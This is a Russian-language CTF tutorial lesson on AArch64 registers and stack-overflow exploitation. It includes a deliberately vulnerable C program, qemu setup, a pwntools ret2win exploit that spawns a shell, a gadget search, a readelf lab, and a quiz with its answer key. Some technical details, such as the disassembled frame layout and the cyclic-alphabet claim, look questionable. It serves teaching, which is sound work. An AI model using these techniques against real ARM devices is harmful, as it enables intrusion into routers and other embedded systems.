---
id: pwn-arm64-basics
title: "ARM64/AArch64: регистры, вызовы и эксплуатация"
category: pwn
parent: pwn-calling-conventions
difficulty: medium
order: 1
tags: [arm64, aarch64, registers, qemu, exploitation, ret2win]
prerequisites: [pwn-calling-conventions, pwn-buffer-overflow]
useful_for:
  - "CTF Pwn категория"
  - "Эксплуатация ARM-устройств"
  - "IoT / embedded security"
estimated_minutes: 55
summary: "Осваиваем AArch64: регистры и инструкции, особенности стека и адреса возврата, а также собираем ret2win-эксплойт и запускаем его через qemu-aarch64."
lab:
  kind: shell
  title: "Практика: заголовок AArch64-бинаря"
  toolset: [core, elf]
  workdir: /home/student/task
  files: [task.md, arm64.elf, arm64.readelf.txt]
  check: "grep -q 'machine=AArch64' answer.txt"
  hints:
    - "ARM64-бинарь не запустится на x86-64 — его читают статически."
    - "`readelf --file-header` печатает `Machine:` — архитектуру цели."
    - "Первый аргумент функции на AArch64 передаётся в `x0` (не `rdi`)."
    - "Запиши `machine=<значение Machine>` из заголовка."
---

## Вопрос, с которого всё начинается

Ты привык к x86-64: `rdi` — первый аргумент, адрес возврата — на стеке. А теперь тебе дали бинарь для ARM64 — например, вытащенный из прошивки роутера или из CTF-задачи. Всё другое: имена регистров, инструкции, даже способ возврата из функции.

Хорошая новость: принцип переполнения тот же. Плохая: детали надо знать. Разберём ARM64 на том же примере ret2win.

## Наш пример: тот же vuln, но для ARM

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
void win(void) { system("/bin/sh"); }
int main(void) {
    char buf[64];
    gets(buf);
    return 0;
}
```

Компилируем кросс-компилятором под AArch64:

```bash
$ aarch64-linux-gnu-gcc -fno-stack-protector -no-pie -o vuln_arm vuln.c
$ file vuln_arm
vuln_arm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV),
          dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, not stripped
```

Получился бинарь под другую архитектуру. На x86-64 он не запустится напрямую — нужен эмулятор.

## Шаг 1. Регистры ARM64

На AArch64 регистры общего назначения называются `x0`…`x30`, и у каждого есть 32-битная «половинка» `w0`…`w30`. Для сравнения:

| Роль | x86-64 | ARM64 |
|---|---|---|
| 1-й аргумент | `rdi` | `x0` |
| 2-й аргумент | `rsi` | `x1` |
| 3-й аргумент | `rdx` | `x2` |
| результат | `rax` | `x0` |
| указатель стека | `rsp` | `sp` |
| адрес возврата | на стеке | `x30` (он же `lr`) |

Здесь нет `rbp`: ARM64 адресует локальные переменные через `sp` и отдельный регистр `x29` (frame pointer, `fp`). Зато есть `x30` — **link register**, `lr`. При вызове функции `bl` (branch with link) кладёт туда адрес возврата.

## Шаг 2. Как ARM64 хранит адрес возврата

Вот главное отличие. На x86-64 адрес возврата всегда лежит на стеке — `call` его туда кладёт, `ret` оттуда забирает. На ARM64 адрес возврата хранится **в регистре `x30`**.

Посмотрим, что делает функция:

```asm
00000000004005c0 <main>:
  4005c0:  a9bf7bfd   stp  x29, x30, [sp, #-16]!   ; сохраняем fp и lr на стек
  4005c4:  910003fd   mov  x29, sp
  4005c8:  9100c3e0   add  x0, sp, #0x30           ; x0 = адрес buf
  4005cc:  97ffffd9   bl   400530 <gets@plt>
  4005d0:  a8c17bfd   ldp  x29, x30, [sp], #16     ; восстанавливаем lr
  4005d4:  d65f03c0   ret                          ; прыжок по x30
```

`stp x29, x30, [sp, #-16]!` — инструкция «store pair»: сохраняет `x29` и `x30` на стек и сдвигает `sp`. Именно поэтому адрес возврата **всё равно оказывается на стеке** — функция сама его туда сохраняет, а перед `ret` восстанавливает.

Значит, переполнение работает так же: если залить буфер, мы доберёмся до сохранённого `x30` и подменим адрес возврата. Разница только в деталях раскладки.

## Шаг 3. Запускаем через qemu-aarch64

Чтобы запустить ARM-бинарь на x86-машине, нужен `qemu-user` и библиотеки AArch64:

```bash
$ sudo apt install qemu-user qemu-user-static gcc-aarch64-linux-gnu libc6-arm64-cross
$ qemu-aarch64 -L /usr/aarch64-linux-gnu ./vuln_arm
hello
```

`-L` указывает каталог с ARM-библиотеками (в том числе `libc.so.6` для AArch64). Для отладки добавляют `-g 1234` — QEMU откроет gdbstub на порту 1234, к которому подключается `gdb-multiarch`.

## Шаг 4. Ищем смещение

Трюк с cyclic работает и здесь, но регистр называется `x30`. Подадим паттерн:

```bash
$ qemu-aarch64 -L /usr/aarch64-linux-gnu ./vuln_arm < pattern.txt
```

Под `gdb-multiarch` смотрим, что в `x30`:

```bash
(gdb) info registers x30
x30   0x6161616b6161616a
```

Дальше `cyclic_find` — как обычно:

```python
>>> from pwn import *
>>> cyclic_find(0x6161616b6161616a, alphabet=b'abcdefghijklmnopqrstuvwxyz')
72
```

Смещение то же — 72. Но осторожно: на ARM64 паттерн генерируется иначе (там нет нулевого байта, который «ломает» строку), и `cyclic` нужно вызывать с правильным `alphabet`. Подробнее — в разделе про подводные камни.

## Шаг 5. Собираем ret2win

Схема та же: мусор до смещения, затем адрес `win`.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln_arm')
context.arch = 'aarch64'
OFFSET = 72
win = elf.symbols['win']

p = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu', './vuln_arm'])
p.sendline(b'A' * OFFSET + p64(win))
p.interactive()
```

```bash
$ python3 exp.py
[*] '/vuln_arm'
    Arch:     aarch64-64-little
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Тот же результат — shell получен.

## Шаг 6. Как передать аргумент

Если `win` принимает аргумент, на ARM64 первый аргумент идёт в `x0`. Значит, нужен гаджет, кладущий значение в `x0`. На ARM64 `pop` встречается редко (архитектура load/store), поэтому ищут гаджеты вида `ldr x0, [sp, #N]; ...; ret` или используют `x0`, уже оставленный предыдущей функцией.

```bash
$ ROPgadget --binary ./vuln_arm --only "ldr|ret"
0x4005e0 : ldr x0, [sp, #8] ; ldp x29, x30, [sp], #16 ; ret
```

Гаджетов на ARM64 меньше, и они «шире» — по 4 байта на инструкцию. Это одна из причин, почему ARM64-эксплуатация сложнее x86-64.

## Установка окружения

Чтобы работать с ARM64 на обычной x86-машине, ставим кросс-компилятор, эмулятор и библиотеки:

```bash
$ sudo apt install qemu-user qemu-user-static gcc-aarch64-linux-gnu libc6-arm64-cross
```

- `gcc-aarch64-linux-gnu` — компилятор, собирающий бинари под AArch64;
- `qemu-user` — эмулятор, исполняющий ARM-код на x86;
- `libc6-arm64-cross` — ARM-версия libc, без неё динамический бинарь не запустится.

Если нужно, чтобы ARM-бинарники запускались «как обычные» (двойным щелчком, без явного `qemu`), включают `binfmt_misc` через `qemu-user-static`. Но для отладки удобнее запускать явно — так виден sysroot.

| Инструмент | Назначение |
|---|---|
| `aarch64-linux-gnu-gcc` | компиляция под ARM64 |
| `qemu-aarch64 -L <sysroot>` | запуск ARM-бинаря |
| `qemu-aarch64 -g 1234` | gdbstub для отладки |
| `gdb-multiarch` | отладчик с поддержкой ARM64 |
| `ROPgadget --binary` | поиск гаджетов (работает и для ARM) |
| `pwntools context.arch='aarch64'` | генерация shellcode под ARM64 |

## Шпаргалка по ARM64-инструкциям

При чтении ARM64-дизассемблера чаще всего встречаются такие инструкции:

| Инструкция | Что делает |
|---|---|
| `mov x0, x1` | копирует значение из `x1` в `x0` |
| `ldr x0, [sp, #8]` | загружает 8 байт из памяти в `x0` |
| `str x0, [sp, #8]` | сохраняет `x0` в память |
| `stp x29, x30, [sp, #-16]!` | сохраняет пару регистров, сдвигая `sp` |
| `ldp x29, x30, [sp], #16` | восстанавливает пару, сдвигая `sp` назад |
| `bl func` | вызов функции (адрес возврата в `x30`) |
| `br x0` | переход по адресу в `x0` |
| `ret` | возврат по адресу в `x30` |
| `svc #0` | системный вызов (аналог `syscall`) |

Восклицательный знак в `[sp, #-16]!` означает «обновить `sp`» — адрес базы меняется до/после доступа. Это аналог того, что на x86 делает `push`.

## Инструмент: readelf — разбор ELF

`readelf` читает заголовки ELF-файла: архитектуру, тип, секции, сегменты и включённые защиты. С него начинается любой разбор нативного бинарника.

Ключи, которые пригодятся:
* `readelf -h <файл>` — заголовок: класс (32/64), машина, точка входа;
* `readelf -S <файл>` — таблица секций (`.text`, `.plt`, `.got`, `.data`);
* `readelf -s <файл>` — таблица символов (как `nm`, но с секциями и типами);
* `readelf -l <файл>` — сегменты программы; ищи `GNU_STACK`/`GNU_RELRO`, чтобы понять защиты.

### Рабочий пример (как в лаборатории)

```
$ readelf -h arm64
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Position-Independent Executable file)
  Machine:                           AArch64
  Version:                           0x1
  Entry point address:               0x10350
  Start of program headers:          64 (bytes into file)
  Start of section headers:          1424 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         10
  Size of section headers:           64 (bytes)
  Number of section headers:         15
  Section header string table index: 13
```

Подсказка из лаборатории: `readelf [-h | -sW | -lW] <файл> — (replay)`.

## Что мы теперь знаем

- Регистры ARM64: `x0`…`x30`, аргументы в `x0`…`x7`, результат в `x0`.
- Адрес возврата — в `x30` (`lr`), но функция сохраняет его на стек инструкцией `stp`.
- Переполнение на ARM64 работает так же, только цель — сохранённый `x30`.
- Запуск ARM-бинаря: `qemu-aarch64 -L <sysroot> ./binary`.
- Для отладки — `qemu-aarch64 -g` плюс `gdb-multiarch`.
- Гаджеты на ARM64 встречаются реже, что усложняет ROP.

## Квиз

```quiz
- question: "В каком регистре ARM64 передаётся первый аргумент функции?"
  options:
    - "x0"
    - "rdi"
    - "x30"
    - "sp"
  answer: 0
  explanation: "AAPCS64: x0..x7 — первые восемь аргументов, результат тоже в x0."
- question: "Что хранит регистр x30?"
  options:
    - "Адрес возврата (link register)"
    - "Первый аргумент"
    - "Указатель стека"
    - "Результат функции"
  answer: 0
  explanation: "bl кладёт адрес возврата в x30; ret прыгает по нему."
- question: "Как запустить AArch64-бинарь на x86-машине?"
  options:
    - "qemu-aarch64 -L <sysroot> ./binary"
    - "./binary"
    - "wine ./binary"
    - "java ./binary"
  answer: 0
  explanation: "qemu-user эмулирует инструкции ARM64, а -L задаёт путь к ARM-библиотекам."
- question: "Почему адрес возврата ARM64 всё равно оказывается на стеке при переполнении?"
  options:
    - "Функция сама сохраняет x30 на стек через stp"
    - "Его туда кладёт ret"
    - "Он не оказывается на стеке"
    - "Его кладёт syscall"
  answer: 0
  explanation: "Пролог функции сохраняет fp/lr на стек, эпилог восстанавливает их перед ret."
```

## Куда дальше

Мы разобрали базовый ARM64-эксплойт. Дальше логично вернуться к защитам и их обходу: в уроке `pwn-integer-overflow` разберём, как ошибки в арифметике превращаются в переполнение, а затем пойдём к canary и PIE. Запомни главное: **на ARM64 принцип тот же — управляй адресом возврата, но помни про `x0` и `x30`.**

## Где пригодится

- **CTF Pwn:** ARM64-задачи встречаются всё чаще, особенно в embedded-треках.
- **IoT/embedded security:** роутеры, камеры, NAS — сплошь ARM; это база для их эксплуатации.
- **Мобильная безопасность:** Android/iOS-ядра на ARM64, понимание ABI обязательно.
- **Реверс-инжиниринг:** чтение ARM-ассемблера — навык для анализа прошивок.
